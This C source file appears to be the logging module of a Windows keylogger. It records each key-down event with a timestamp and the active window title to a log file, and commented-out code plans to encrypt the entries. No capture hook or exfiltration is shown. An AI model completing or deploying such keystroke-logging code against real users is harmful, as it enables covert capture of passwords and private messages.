// logger.c
#include "logger.h"
#include "encrypt.h"
#include "util.h"
#include <stdio.h>

static FILE *g_file = NULL;
const wchar_t * LOG_DIR = L"../logs";

// Called once at program start
void logger_init(void) {
    int check = _wmkdir(LOG_DIR);

    // check if directory is created or not
    // if (!check)
    //     printf("Directory created\n");
    // else {
    //     printf("Unable to create directory\n");
    //     return;
    // }

    g_file = fopen("../logs/encrypted_log.txt", "wb");

    if (g_file == NULL) {
        // Handle error
        wprintf(L"Failed to open log file for writing.\n");
    }
}

// Called once at program end
void logger_cleanup(void) {
    fclose(g_file);
}

void logger_log_key(const wchar_t *windowTitle, const wchar_t * keyboardState, const wchar_t *keyText) {
    // TODO: 
    // 1. Build timestamp
    // 2. Format message (e.g., "[time] [window] key\n")
    // 3. Convert to bytes
    // 4. Call encrypt_buffer()
    // 5. write encrypted bytes to g_file
    if (wcscmp(keyboardState, L"DOWN") != 0) {
        // Strings are not equal
        return;
    }
    wchar_t timestamp[64];
    util_get_timestamp(timestamp, sizeof(timestamp) / sizeof(wchar_t));
    wchar_t logEntry[512];
    swprintf(logEntry, sizeof(logEntry) / sizeof(wchar_t), L"[%ls] [%ls] [%ls] %ls\n", timestamp, windowTitle, keyboardState, keyText);

    size_t logEntryLen = wcslen(logEntry);
    int utf8Len = WideCharToMultiByte(CP_UTF8, 0, logEntry, (int)logEntryLen,
                                    NULL, 0, NULL, NULL);
    char* utf8Buffer = malloc(utf8Len);
    WideCharToMultiByte(CP_UTF8, 0, logEntry, (int)logEntryLen,
                        utf8Buffer, utf8Len, NULL, NULL);
    fwrite(utf8Buffer, 1, utf8Len, g_file);
    free(utf8Buffer);
    fflush(g_file);


    // Convert to bytes (UTF-8)
    // size_t logEntryLen = wcslen(logEntry);
    // size_t byteLen = logEntryLen * sizeof(wchar_t);
    // unsigned char *byteBuffer = (unsigned char *)logEntry;
    // // Encrypt buffer
    // unsigned char encryptedBuffer[1024];
    // size_t encryptedLen = encrypt_buffer(byteBuffer, byteLen, encryptedBuffer, sizeof(encryptedBuffer));
    // // Write to file
    // fwrite(encryptedBuffer, 1, encryptedLen, g_file);
    // fwrite(logEntry, 1, sizeof(logEntry) / sizeof(wchar_t), g_file);
    // fflush(g_file);
}
